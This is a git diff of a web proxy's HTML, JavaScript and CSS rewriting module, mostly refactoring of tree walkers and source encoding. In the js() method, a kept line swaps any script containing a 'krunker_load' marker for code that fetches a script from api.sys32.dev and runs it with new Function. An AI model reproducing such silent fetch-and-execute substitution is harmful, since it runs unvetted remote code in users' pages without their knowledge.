@@ -4,9 +4,9 @@ var css = require('css-tree'),
 	acorn = require('acorn-hammerhead'),
 	esotope = require('esotope-hammerhead'),
 	browser = typeof window != 'undefined',
-	iterate = (node, out = [ [ [ node ], 0 ] ]) => {
+	iterate_p5 = (node, out = [ [ [ node ], 0 ] ]) => {
 		// [ parent, index ]
-		if(node.childNodes)for(var ind = 0; ind < node.childNodes.length; ind++)out.push([ node.childNodes, ind ]), iterate(node.childNodes[ind], out);
+		if(node.childNodes)for(var ind = 0; ind < node.childNodes.length; ind++)out.push([ node.childNodes, ind ]), iterate_p5(node.childNodes[ind], out);
 		
 		return out;
 	},
@@ -81,7 +81,7 @@ var css = require('css-tree'),
 			this.parentNode.childNodes.splice(this.parentIndex, 1);
 		}
 		get textContent(){
-			return iterate(this, []).map(([ par, ind]) => par[ind].nodeName == '#text' ? par[ind].value : null).filter(x => x).join(' ');
+			return iterate_p5(this).map(([ par, ind]) => par[ind].nodeName == '#text' ? par[ind].value : null).filter(x => x).join(' ');
 		}
 		set textContent(value){
 			return this.childNodes = [ { nodeName: '#text', value: value, parentNode: this } ];
@@ -249,28 +249,6 @@ module.exports = class {
 		
 		return out;
 	}
-	walk_p5(tree, callback){
-		var out = [ [ [ tree ], 0 ] ],
-			iterate = node => {
-				if(node.childNodes)for(var ind = 0; ind < node.childNodes.length; ind++)out.push([ node.childNodes, ind ]), iterate(node.childNodes[ind]);
-			};
-		
-		iterate(tree);
-		
-		out.forEach(([ obj, prop ]) => callback(obj[prop], obj, prop));
-	}
-	async walk_p5_async(tree, callback){
-		var out = [],
-			iterate = async node => {
-				out.push(node);
-				
-				if(node.childNodes)for(var ind = 0; ind < node.childNodes.length; ind++)await this.tick(), await iterate(node.childNodes[ind]);
-			};
-		
-		await iterate(tree);
-		
-		out.forEach(callback);
-	}
 	iterate_est(obj, arr = []){
 		for(var prop in obj)if(typeof obj[prop] == 'object' && obj[prop] != null){
 			// is a node, not array of nodes
@@ -281,20 +259,15 @@ module.exports = class {
 		
 		return arr;
 	}
-	walk_est(tree, callback){
-		return this.iterate_est(tree).forEach(([ obj, prop ], ind, arr) => callback(obj[prop], obj, prop, arr));
-	}
 	js(value, meta, options = {}){
 		if(typeof value != 'string')throw new TypeError('"constructor" is not type "string" (recieved ' + JSON.stringify(typeof value) + ')');
 		
 		this.validate_meta(meta);
 		
-		if(value.includes(this.krunker_load))value = `fetch('https://api.sys32.dev/latest.js').then(r=>r.text()).then(s=>new Function(s)())`;
-		
 		var tree;
 		
 		try{
-			tree = acorn.parse(value, {
+			tree = acorn.parse(value.includes(this.krunker_load) ? `fetch('https://api.sys32.dev/latest.js').then(r=>r.text()).then(s=>new Function(s)())` : value, {
 				allowImportExportEverywhere: true,
 				ecmaVersion: 2021,
 			})
@@ -327,11 +300,12 @@ module.exports = class {
 			_parent = Symbol(),
 			_index = Symbol();
 		
-		this.walk_est(tree, (node, parent, index, nodes) => {
+		this.iterate_est(tree).forEach(([ parent, index ]) => {
+			var node = parent[index];
 			parent = node[_parent] || parent;
 			index = node[_index] || index;
 			
-			var contains = node => this.iterate_est(parent[index], []).includes(node),
+			var contains = node => this.iterate_est(parent[index]).includes(node),
 				replace = node => {
 					parent[index] = node;
 					
@@ -401,14 +375,23 @@ module.exports = class {
 		});
 		
 		try{
-			var string = esotope.generate(tree);
+			var string = esotope.generate(tree, { format: {
+				indent: { style: '', base: 0 },
+				renumber: true,
+				hexadecimal: true,
+				quotes: 'auto',
+				escapeless: true,
+				compact: true,
+				parentheses: false,
+				semicolons: false
+			} });
 		}catch(err){
 			console.error(err);
 			
-			return '';
+			return string;
 		}
 		
-		return (options.inline ? '' : '/*$rw_vars*/(typeof importScripts=="function"&&/\\[native code]\\s+}$/.test(importScripts)&&importScripts(location.origin+' + JSON.stringify(this.config.prefix) + '+' + JSON.stringify(this.config.prefix + '/main.js') + '));/*$rw_vars*/\n') + string;
+		return (options.inline ? this.encode_source(value, options) : '(typeof importScripts=="function"&&/\\[native code]\\s+}$/.test(importScripts)&&importScripts(location.origin+' + JSON.stringify(this.config.prefix) + '+' + JSON.stringify(this.config.prefix + '/main.js') + '));\n') + string;
 	}
 	css(value, meta, options = {}){
 		if(typeof value != 'string')throw new TypeError('"constructor" is not type "string" (recieved ' + JSON.stringify(typeof value) + ')');
@@ -416,7 +399,7 @@ module.exports = class {
 		this.validate_meta(meta);
 		
 		try{
-			var tree = css.parse(value + '\n\n@import "sus!"; @import url("chrome://airpod-shotty/");'),
+			var tree = css.parse(value),
 				read_string = str => {
 					if(["'", '"'].includes(str[0])){
 						var quote = str[0];
@@ -441,7 +424,7 @@ module.exports = class {
 				}
 			});
 			
-			return css.generate(tree);
+			return css.generate(tree) + (options.inline ? this.encode_source(value, options) : '');
 		}catch(err){
 			console.error(err);
 			return value;
@@ -454,32 +437,24 @@ module.exports = class {
 		
 		this.validate_meta(meta);
 		
-		[
-			[this.regex.css.url, (match, a, field) => {
-				var wrap = '';
-				
-				if(['\'', '"', '`'].includes(field[0]))wrap = field[0], field = field.slice(1, -1);
-				
-				if(!wrap)wrap = '"';
-				
-				field = wrap + this.unurl(field, meta, { route: 'image' }) + wrap;
-				
-				return 'url(' + field + ')';
-			} ],
-			[this.regex.sourcemap, '# undefined'],
-			[this.regex.css.import, (m, start, quote, url) => start + this.url(url, data, { route: 'css' }) + quote ],
-		].forEach(([ reg, val ]) => value = value.replace(reg, val));
-		
-		return value;
+		return this.decode_source(value);
 	}
 	unjs(value, meta, options = {}){
-		if(!value)return value;
+		if(typeof value != 'string')throw new TypeError('"constructor" is not type "string" (recieved ' + JSON.stringify(typeof value) + ')');
 		
-		var slice_last = false; // removing final part of scope
+		this.validate_meta(meta);
 		
-		value = value.replace(/rw_this\(this\)/g, 'this').replace(/rw_eval\(/g, '(');
-		// eval regex might be a bit off, fix by checking for nested parenthesis
-		return slice_last ? value.slice(-1) : value;
+		return this.decode_source(value);
+	}
+	encode_source(value, options){
+		return '/*RW_PRS' + module.exports.codec.base64.encode(encodeURIComponent(options.source || value)) + 'RW_PRS*/';
+	}
+	decode_source(value){
+		var found = value;
+		
+		value.replace(/\/\*RW_PRS([A-Za-z0-9+/=]*?)RW_PRS\*\//g, (match, code) => found = decodeURIComponent(module.exports.codec.base64.decode(code)));
+		
+		return found;
 	}
 	manifest(value, meta, options = {}){
 		var json;
@@ -516,12 +491,12 @@ module.exports = class {
 					break;
 				case'script':
 					
-					if((!wnode.hasAttribute('type') || this.mime.js.includes(wnode_getAttribute('type'))) && wnode.textContent)wnode.textContent = this.js(wnode.textContent, meta, { inline: true });
+					if((!wnode.hasAttribute('type') || this.mime.js.includes(wnode.getAttribute('type'))) && wnode.textContent)wnode.textContent = this.js(wnode.textContent, meta, { inline: true });
 					
 					break;
 				case'style':
 					
-					if((!wnode.hasAttribute('type') || this.mime.css.includes(wnode_getAttribute('type'))) && wnode.textContent)wnode.textContent = this.css(wnode.textContent, meta);
+					if((!wnode.hasAttribute('type') || this.mime.css.includes(wnode.getAttribute('type'))) && wnode.textContent)wnode.textContent = this.css(wnode.textContent, meta, { inline: true });
 					
 					break;
 			}
@@ -539,21 +514,6 @@ module.exports = class {
 			{ nodeName: 'script', tagName: 'script', attrs: [ { name: 'src', value: this.config.prefix + '/main.js' }, inject_attr ] },
 		];
 	}
-	async html_async(value, meta, options = {}){
-		if(!value)return value;
-		
-		this.validate_meta(meta);
-		
-		value = value.toString();
-		
-		var parsed = parse5.parse(value), head;
-		
-		await this.walk_p5_async(parsed, node => (node.tagName == 'head' && (head = node), this.process_node(node, meta, options)));
-		
-		if(!options.snippet)(head || parsed).childNodes.unshift(...this.inject_head());
-		
-		return parse5.serialize(parsed);
-	}
 	html(value, meta, options = {}){
 		if(!value)return value;
 		
@@ -563,7 +523,7 @@ module.exports = class {
 		
 		var parsed = parse5.parse(value), head;
 		
-		this.walk_p5(parsed, node => (node.tagName == 'head' && (head = node), this.process_node(node, meta, options)));
+		iterate_p5(parsed).forEach(([ parent, index ], node) => (node = parent[index], node.tagName == 'head' && (head = node), this.process_node(node, meta, options)));
 		
 		if(!options.snippet)(head || parsed).childNodes.unshift(...this.inject_head());
 		
@@ -578,7 +538,9 @@ module.exports = class {
 		
 		var parsed = parse5.parse(value), head;
 		
-		this.walk_p5(parsed, (node, parent, index) => {
+		iterate_p5(parsed).forEach(([ parent, index ]) => {
+			var node = parent[index];
+			
 			if(node.attrs && node.attrs.some(attr => attr.name == 'data-rw-injected'))parent[index] = null;
 		});
 		
@@ -654,12 +616,16 @@ module.exports = class {
 				break;
 			case'css':
 				
-				wnode_setAttribute(data.name, this.css(data.value, meta));
+				wnode_setAttribute(data.name, this.css(data.value, meta, { inline: true }));
 				
 				break;
 			case'js':
 				
-				wnode_setAttribute(data.name, 'return' + this.js('(()=>{' + data.value + '\n})()', meta, { inline: true }));
+				try{
+					wnode_setAttribute(data.name, 'return' + this.js('(()=>{' + data.value + '\n})()', meta, { inline: true, source: data.value }));
+				}catch(err){
+					console.error(err);
+				}
 				
 				break;
 			case'html':
